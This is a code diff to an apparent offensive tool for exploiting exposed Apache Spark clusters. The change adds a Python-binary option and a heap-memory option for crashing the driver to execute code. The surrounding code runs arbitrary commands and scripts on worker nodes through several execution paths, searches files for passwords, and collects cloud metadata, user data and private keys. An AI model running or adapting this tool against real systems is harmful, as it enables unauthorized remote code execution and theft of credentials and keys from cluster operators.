@@ -40,6 +40,14 @@ def validateYarnOptions(results):
         sys.exit(-1)
 
 
+def displayWarningPy():
+    whine(
+        "Spark workers running a different version than Python %s.%s will throw errors. See -P option"
+        % (sys.version_info[0], sys.version_info[1]),
+        "warn",
+    )
+
+
 def main(results):
     hostPort = results.spark_master.split(":")
     localIP = results.driver_ip
@@ -49,6 +57,7 @@ def main(results):
     binPath = results.binPath
     restJarURL = results.restJarURL
     useScala = results.useScala
+    pyBinary = results.pyBinary
     useRest = False
     useBlind = False
     port = 8032 if results.yarn else 7077
@@ -75,7 +84,10 @@ def main(results):
             sys.exit(-1)
 
     confirmSpark(sClient)
-    sClient.prepareConf(results.secret)
+    if sys.version_info[0] > 2 and results.pyBinary == "python":
+        displayWarningPy()
+
+    sClient.prepareConf(results.secret, results.pyBinary)
 
     if results.listNodes:
         checkRestPort(sClient)
@@ -104,47 +116,70 @@ def main(results):
 
     if results.passwdInFile:
         scriptContent = open("./utils/searchPass.py", "r").read()
-        interpreterArgs = ["python", "-c", scriptContent, results.extension]
+        interpreterArgs = [pyBinary, "-c", scriptContent, results.extension]
         parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.cmd:
         if useBlind:
-            blindCommandExec(sClient, binPath, base64.b64encode(results.cmd))
+            blindCommandExec(
+                sClient,
+                binPath,
+                base64.b64encode(results.cmd.encode("utf-8")),
+                results.maxMem,
+            )
         elif useRest:
-            restCommandExec(sClient, binPath, base64.b64encode(results.cmd), restJarURL)
+            restCommandExec(
+                sClient,
+                binPath,
+                base64.b64encode(results.cmd),
+                restJarURL,
+                results.maxMem,
+            )
         elif useScala:
             hydratedCMD = "rm *.jar 2> /dev/null; %s" % results.cmd
-            scalaCommandExec(sClient, base64.b64encode(hydratedCMD), results.numWokers)
+            scalaCommandExec(
+                sClient,
+                base64.b64encode(hydratedCMD.encode("utf-8")),
+                results.numWokers,
+            )
         else:
             interpreterArgs = [binPath, "-c", results.cmd]
             parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.script:
-        scriptContent = results.script.read()
+        scriptContent = results.script.read().encode("utf-8")
         if useBlind:
-            blindCommandExec(sClient, binPath, base64.b64encode(scriptContent))
+            blindCommandExec(
+                sClient, binPath, base64.b64encode(scriptContent), results.maxMem
+            )
         elif useRest:
-            restCommandExec(sClient, binPath, base64.b64encode(scriptContent))
+            restCommandExec(
+                sClient, binPath, base64.b64encode(scriptContent), results.maxMem
+            )
         elif useScala:
             hydratedCMD = "rm *.jar 2> /dev/null;%s" % scriptContent
-            scalaCommandExec(sClient, base64.b64encode(hydratedCMD), results.numWokers)
+            scalaCommandExec(
+                sClient,
+                base64.b64encode(hydratedCMD.encode("utf-8")),
+                results.numWokers,
+            )
         else:
             interpreterArgs = [binPath, "-c", scriptContent]
             parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.metadata:
         scriptContent = open("./utils/cloud.py", "r").read()
-        interpreterArgs = ["python", "-c", scriptContent, "metadata"]
+        interpreterArgs = [pyBinary, "-c", scriptContent, "metadata"]
         parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.userdata:
         scriptContent = open("./utils/cloud.py", "r").read()
-        interpreterArgs = ["python", "-c", scriptContent, "userdata"]
+        interpreterArgs = [pyBinary, "-c", scriptContent, "userdata"]
         parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
     if results.privatekey:
         scriptContent = open("./utils/cloud.py", "r").read()
-        interpreterArgs = ["python", "-c", scriptContent, "privatekey"]
+        interpreterArgs = [pyBinary, "-c", scriptContent, "privatekey"]
         parseCommandOutput(sClient, interpreterArgs, results.numWokers)
 
 
@@ -202,6 +237,13 @@ if __name__ == "__main__":
         help="Secret to authenticate to Spark master when authentication is required",
         default="",
         dest="secret",
+    )
+    group_general.add_argument(
+        "-P",
+        "--py",
+        help="Python binary to execute worker commands. Can be full path. Version must match the binary used to execute this tool.",
+        default="python",
+        dest="pyBinary",
     )
 
     group_general.add_argument(
@@ -292,6 +334,13 @@ if __name__ == "__main__":
         dest="blind",
     )
     group_cmd.add_argument(
+        "-m",
+        "--max-memory",
+        help='Maximum Heap memory allocated to drive to make it crash and execute code. Usually varies between 1 and 10 (MB) Use with "-b" option',
+        default="2",
+        dest="maxMem",
+    )
+    group_cmd.add_argument(
         "-n",
         "--num-workers",
         type=int,
@@ -333,7 +382,7 @@ if __name__ == "__main__":
         dest="userdata",
     )
     group_cloud.add_argument(
-        "-m",
+        "-g",
         "--meta-data",
         action="store_true",
         help="Gather metadata information from the cloud provider",
